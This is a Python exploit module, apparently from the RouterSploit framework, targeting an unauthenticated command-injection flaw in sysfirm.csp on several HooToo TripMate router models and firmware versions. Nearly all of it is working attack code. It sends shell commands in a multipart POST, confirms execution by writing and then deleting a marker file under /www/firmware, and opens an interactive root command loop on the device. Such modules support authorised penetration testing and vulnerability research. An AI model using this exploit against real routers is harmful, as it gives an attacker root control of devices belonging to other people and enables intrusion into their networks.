from routersploit import (
    exploits,
    print_success,
    print_status,
    print_error,
    http_request,
    validators,
    random_text,
    shell,
    mute,
)


class Exploit(exploits.Exploit):

    """Exploit implementation for unauthenticated RCE vulnerability in sysfirm.csp on HooToo TripMate routers."""

    __info__ = {
        'name': 'HooToo TripMate sysfirm.csp RCE',
        'authors': [
            'Tao "depierre" Sauvage',
        ],
        'description': 'Module exploits TripMate unauthenticated remote code execution vulnerability in sysfirm.csp, '
                       'which allows executing commands on the router with root privileges.',
        'references': [
            'http://blog.ioactive.com/2018/04/hootoo-tripmate-routers-are-cute-but.html',
            'https://www.ioactive.com/pdfs/HooToo_Security_Advisory_FINAL_4.19.18.pdf'
        ],
        'devices': [
            'HooToo TripMate HT-TM01, firmware fw-WiFiDGRJ-HooToo-TM01-2.000.046',
            'HooToo TripMate Nano HT-TM02, firmware fw-WiFiPort-HooToo-TM02-2.000.072',
            'HooToo TripMate Mini HT-TM03, firmware fw-WiFiSDRJ-HooToo-TM03-2.000.016',
            'HooToo TripMate Elite HT-TM04, firmware fw-WiFiDGRJ2-HooToo-TM04-2.000.008',
            'HooToo TripMate Titan HT-TM05, firmware fw-7620-WiFiDGRJ-HooToo-HT-TM05-2.000.080.080',
            'HooToo TripMate Elite U HT-TM06, firmware fw-7620-WiFiDGRJ-HooToo-633-HT-TM06-2.000.048',
        ],
    }

    target = exploits.Option('', 'Target address running ioos, e.g. http://10.10.10.254', validators=validators.url)
    port = exploits.Option(81, 'Target port running ioos')

    def run(self):
        if self.check():
            print_success('Target is vulnerable')
            print_status('Blind command injection - response is not available')
            print_status('Possible extraction point:')
            print_status('\t- Run "CMD > /www/firmware/routersploit.res"')
            print_status('\t- The result of CMD will be available at {}:{}/firmware/routersploit.res'.format(self.target, self.port))
            print_status("Invoking command loop (type 'exit' or 'quit' to exit the loop)...")
            shell(self, method='generic', architecture='mipsle', location='/tmp/')
        else:
            print_error('Target is not vulnerable')

    def execute(self, cmd):
        url = u'{}:{}/sysfirm.csp'.format(self.target, self.port)
        http_request(method=u'POST', url=url, files={'file': ('foo', cmd), 'fname': (None, 'sysupfileform')})
        return ''  # Blind RCE so no response available

    @mute
    def check(self):
        url = u'{}:{}/sysfirm.csp'.format(self.target, self.port)
        # Blind unauth RCE
        # 1. Create a file in the /www/firwmare/ directory (writeable).
        marker = random_text(64)
        cmd_echo = u'echo {0} > /www/firmware/{0}'.format(marker)
        response = http_request(method=u'POST', url=url, files={'file': ('foo', cmd_echo), 'fname': (None, 'sysupfileform')})
        if not response:
            return False
        # 2. Check that the file was successfully created>
        url_marker = u'{}:{}/firmware/{}'.format(self.target, self.port, marker)
        response = None
        # Command run in a thread so it might take a few milliseconds to complete.
        for retry in range(5):
            response = http_request(method=u'GET', url=url_marker)
            if not response:
                continue
            if response.status_code == 200:
                break
        if not response or not response.status_code == 200 or marker not in response.text:
            return False
        # 3. Clean up the temp file.
        cmd_rm = u'rm -f /www/firmware/{}'.format(marker)
        http_request(method=u'POST', url=url, files={'file': ('foo', cmd_rm), 'fname': (None, 'sysupfileform')})
        return True
